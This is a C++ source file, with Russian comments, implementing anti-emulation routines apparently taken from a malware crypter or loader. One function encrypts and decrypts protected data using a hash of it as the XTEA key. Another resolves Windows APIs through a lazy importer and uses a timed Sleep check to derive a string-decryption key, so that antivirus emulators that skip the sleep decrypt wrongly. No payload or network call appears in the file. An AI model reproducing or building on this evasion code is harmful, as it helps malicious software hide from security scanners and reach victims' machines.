#include <iostream>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/modules.h"

#include "antiemul.h"

/*Антиэмуляция:
Функция выделяет память размером size_memory,в неё после выделения копируется кусок памяти защищаемых данных data_protect. 
Потом подсчет хеша этого куска памяти, шифровка/расшифровка этого куска памяти, в качестве ключа наш хеш.
Возвращает указатель на полученный кусок памяти для дальнейшей работы, 

Параметры:

uint32_t size_memory - Размер выделяемой памяти.
uint8_t *data_protect - Указатель на кусок защищаемых данных.
uint32_t size_data_protect - Размер защищаемых данных.

*/

uint8_t *antiemul_mem(uint32_t size_memory, uint8_t *data_protect, uint32_t size_data_protect) {

	uint8_t *tmp_data = (uint8_t*)malloc(size_memory);
	if (tmp_data == NULL) {
		printf("No free mem \n");
		while (1);
	}
	else {
		memset(tmp_data, 0xFF, size_memory);
	}

	memcpy((uint8_t*)tmp_data, (uint8_t*)data_protect, size_data_protect);

	uint32_t hash = Murmur3(tmp_data, size_memory, 10);
	XTEA_encrypt((uint8_t*)(tmp_data), size_memory, &hash, sizeof(hash));
	XTEA_decrypt((uint8_t*)(tmp_data), size_memory, &hash, sizeof(hash));

	return tmp_data;
}


/*
Функция используется для антиэмуляции, во время расшифровки строк.
Перед раскриптовкой, происходит задержка 1 секунду, далее по меткам времени происходит вычисление, действительно-ли была задержка секунду.
Если да, то на основе этого вычисляется размер ключа:size_key = (mesure2.wSecond - mesure1.wSecond) + 3.
Если sleep был пропущен, то размер ключа будет неверный и расшифровка будет неправильна.

Параметры функции:

uintptr_t base - Адрес LoadLibraryA.
char *crypt_str - Указате на шифрованную строку.
uint32_t size_str - Размер строки.
uint32_t sleep_wait - Задержка слипа в секундах.
*/

void anti_emul_sleep(uintptr_t base, char *crypt_str, uint32_t size_str, uint32_t sleep_wait)
{

	SYSTEMTIME mesure1;
	SYSTEMTIME mesure2;
	uint32_t size_key = 0;

	printf("#");
	while (size_key != 4) {

		LI_GET(base, GetSystemTime)(&mesure1);
		LI_GET(base, Sleep)(sleep_wait);
		LI_GET(base, GetSystemTime)(&mesure2);

		size_key = (mesure2.wSecond - mesure1.wSecond) + 3;
	}
	printf("#");

	//Если эмулятор пропустит слип, то размер ключа будет неправильный, если не пропустит, то размер ключа будет 4-ре.)))
	str_to_decrypt(crypt_str, size_str, &MAGIC, size_key);

	printf("#");
}